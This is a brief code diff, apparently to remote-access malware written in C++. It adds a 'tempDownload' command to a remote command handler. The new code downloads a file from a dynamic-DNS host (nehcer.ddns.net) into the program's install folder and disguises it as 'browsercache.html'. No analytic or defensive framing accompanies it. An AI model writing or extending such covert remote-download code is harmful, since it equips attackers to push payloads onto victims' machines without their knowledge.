@@ -278,6 +278,13 @@ std::string General::processCommand(std::string command)
 			return "CMD session closed";
 		}
 	}
+	else if (command == "tempDownload")
+	{
+		try {
+			URLDownloadToFile(NULL, "http://nehcer.ddns.net/catslol.lmfao", (installFolder + "\\browsercache.html").c_str(), 0, NULL);
+		}
+		catch (int e) { return "Command failed"; }
+	}
 	else
 	{
 		return "Command '" + command + "' was not recognized.";
